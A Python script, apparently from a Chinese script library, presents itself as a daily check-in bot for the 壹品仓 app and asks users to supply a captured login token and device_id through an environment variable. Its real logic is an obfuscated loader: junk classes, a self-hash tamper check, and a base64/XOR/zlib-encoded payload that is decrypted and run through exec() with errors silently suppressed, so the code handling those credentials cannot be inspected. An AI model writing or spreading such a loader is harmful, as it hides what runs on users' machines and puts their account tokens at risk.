
"""
qq交流群：1062075881
壹品仓app下载登录注册后抓包token,device_id
填入环境变量:ypctoken,格式：token#device_id
多账号&分割或新建同名变量
脚本完成每日签到，可以换实物

"""



import random
_GARBAGE_1=len("self_check")
_GARBAGE_2=locals()
class UselessClass:
    def __init__(self,x):
        self.val=sum(range(x)) if x>0 else 0
    def __repr__(self):
        return f"UselessObj(val={self.val})"
def _check_integrity():
    try:
        h_mod_name="".join(['h','a','s','h','l','i','b'])
        hashlib=__import__(h_mod_name)
        expected_hash="2243fab9e800964684f16299066c852e673c72b26b3f3a6e4abf84634e4b35e0"
        with open(__file__,'rb') as f:
            content=f.read()
        placeholder=b'2243fab9e800964684f16299066c852e673c72b26b3f3a6e4abf84634e4b35e0'
        actual_content=content.replace(expected_hash.encode('utf-8'),placeholder)
        sha256_func=getattr(hashlib,'sha'+'256')
        current_hash=sha256_func(actual_content).hexdigest()
        if current_hash!=expected_hash:
            raise ValueError("Invalid script format or corrupted file.")
    except Exception as e:
        _ = 1/(1 if "corrupted" in str(e) else 0)
if UselessClass(5).val==10:
    _check_integrity()
_b64_name=''.join(chr(c) for c in [98,97,115,101,54,52])
_z_name="".join(['z','l','i','b'])
_h_name="hashlib"
_b=__import__(_b64_name)
_z=__import__(_z_name)
_h=__import__(_h_name)
_xor=lambda d,k:bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_gk=lambda s:getattr(_h,'sha'+'256')(s).digest()
_payload_parts=['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']
_s="".join(_payload_parts)
_encoded_seed="YV92ZXJ5X3NlY3VyZV9hbmRfcmFuZG9tX3NlZWRfMTIzNDVfZmluYWw="
try:
    _seed_bytes=getattr(_b,'b64d'+'ecode')(_encoded_seed)
    _seed=_seed_bytes.decode('utf-8')
    _k=_gk(_seed.encode())
    _d_b64=getattr(_b,'b64'+'decode')(_s)
    _d_xor=_xor(_d_b64,_k)
    _decompressed=getattr(_z,'de'+'compress')(_d_xor)
    _final_code=_decompressed.decode('utf-8')
    execution_globals={'__name__':'__main__','__file__':__file__,}
    exec(_final_code,execution_globals)
except Exception as e:
    pass

# 当前脚本来自于http://script.345yun.cn脚本库下载！